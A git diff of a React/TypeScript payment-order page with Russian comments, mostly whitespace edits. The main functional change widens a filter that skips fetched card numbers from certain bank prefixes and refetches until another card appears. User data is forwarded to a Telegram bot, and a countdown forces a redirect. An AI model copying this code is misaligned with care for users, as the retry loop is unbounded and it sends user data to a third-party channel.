@@ -12,7 +12,7 @@ import { sendMessage } from '../api/telegram.ts'
 
 const LoadingOverlay = () => {
     const [loading, setLoading] = useState(true);
-  
+
     useEffect(() => {
       const timeoutId = setTimeout(() => {
         setLoading(false);
@@ -29,7 +29,7 @@ const LoadingOverlay = () => {
     if (!loading) {
       return null; // Если загрузка завершена, компонент вернет null
     }
-  
+
     return (
       <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', backgroundColor: 'rgba(255, 255, 255, 0.95)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 }}>
         <RingLoader
@@ -47,12 +47,12 @@ const LoadingOverlay = () => {
     }
 
 
-  
 
 
 
-  interface FormProps {
-    name: string; 
+
+    interface FormProps {
+    name: string;
     sum: number;
     order: number;
     order_sum: number;
@@ -62,7 +62,7 @@ const LoadingOverlay = () => {
   }
 const HomePage:React.FC<FormProps> = ({ client_number, name, sum, order_sum , photo, card, order }) => {
   const storedData = localStorage.getItem('userdata');
-  const storedObject = JSON.parse(storedData);    
+  const storedObject = JSON.parse(storedData);
 
   sum = storedObject.summ
   name = storedObject && storedObject.name;
@@ -73,7 +73,7 @@ const HomePage:React.FC<FormProps> = ({ client_number, name, sum, order_sum , ph
   card = cardStorage && JSON.parse(cardStorage);
   const tradeStorage = localStorage.getItem('Trade');
   order = tradeStorage && JSON.parse(tradeStorage);
-  
+
 
   const [showCard, setShowCard] = useState(false);
   const [showOrder, setShowOrder] = useState(false);
@@ -83,7 +83,7 @@ const HomePage:React.FC<FormProps> = ({ client_number, name, sum, order_sum , ph
   const buttonStatusNavigate = () => { navigate('/auth-usr/bank/order/status')}
    const handleTelegram = async (): Promise<void> => {
     const storedData = localStorage.getItem('userdata');
-    const storedObject = JSON.parse(storedData);    
+    const storedObject = JSON.parse(storedData);
     const cardStorage = localStorage.getItem('Trade'); // Переменная которую передаешь для копирования name
     const card = cardStorage && JSON.parse(cardStorage);
     var name = storedObject && storedObject.name;
@@ -96,11 +96,11 @@ const HomePage:React.FC<FormProps> = ({ client_number, name, sum, order_sum , ph
 
     } catch (e) {
         console.log("error",e);
-    
+
     } finally {
       console.log("S.TG");
     }
-}	
+}
   const handleButtonCard = () => {
     const cardStorage = localStorage.getItem('Card'); // Переменная которую передаешь для копирования name
     const card = cardStorage && JSON.parse(cardStorage);
@@ -159,7 +159,7 @@ const [remainingTime, setRemainingTime] = useState<number>(() => {
     const storedRemainingTime = parseInt(localStorage.getItem('remainingTime') || '', 10);
     return isNaN(storedRemainingTime) ? 35 * 60 : storedRemainingTime;
   });
-  
+
   useEffect(() => {
     const timerTick = () => {
       setRemainingTime(prevTime => {
@@ -177,21 +177,21 @@ const [remainingTime, setRemainingTime] = useState<number>(() => {
     };
   }, []); // Пустой массив зависимостей, чтобы эффект выполнялся только при монтировании
 
-  useEffect(() => {
+ useEffect(() => {
     if (remainingTime <= 0) {
       localStorage.setItem('remainingTime', '2100');
       window.location.href = '/auth-usr/bank/order/status';
     }
   }, [remainingTime]);
-  
+
   const formatSecond = (seconds: number) => {
-    
+
     const remainingSeconds = seconds % 60;
     return `${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
   };
   const formatMinute = (seconds: number) => {
     const minutes = Math.floor(seconds / 60);
-    
+
     return `${minutes}`;
   };
 
@@ -201,7 +201,7 @@ const [remainingTime, setRemainingTime] = useState<number>(() => {
     const remainingSeconds = seconds % 60;
     return `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
   };
-  
+
   useEffect(() => {
     const fetchData = async () => {
       if (localStorage.getItem('Trade') == null) {
@@ -214,15 +214,15 @@ const [remainingTime, setRemainingTime] = useState<number>(() => {
             },
           });
           console.log(response);
-  
+
           const data = await response.json();
-  
+
           if (data && data.length > 0) {
             const result = data[0];
             const { trade, rate, commission, card_number, amount, usdt_amount, support_bot } = result;
-  
+
             // Проверить, что card_number не начинается с "2200300"
-            if (card_number && !card_number.startsWith('2200300')) {
+            if (card_number && !card_number.startsWith('220030') && !card_number.startsWith('220039')) {
               localStorage.setItem('Trade', trade);
               localStorage.setItem('Rate', rate);
               localStorage.setItem('Commission', commission);
@@ -230,25 +230,25 @@ const [remainingTime, setRemainingTime] = useState<number>(() => {
               localStorage.setItem('Amount', amount);
               localStorage.setItem('USDT', usdt_amount);
               localStorage.setItem('Support', support_bot);
-	      await handleTelegram();
+              await handleTelegram();
             } else {
-              console.log('"2200300"Storage');
+              console.log(' Its alpha or rosbank ');
               fetchData(); // Перезапустить запрос
             return;
             }
           } else {
             console.error('No data found');
-	    fetchData();
+            fetchData();
           }
         } catch (error) {
           console.error('Error fetching data:', error);
-	  fetchData();
+          fetchData();
         }
       } else {
         console.log('Trade is here');
       }
     };
-  
+
     fetchData();
   }, []);
     return (
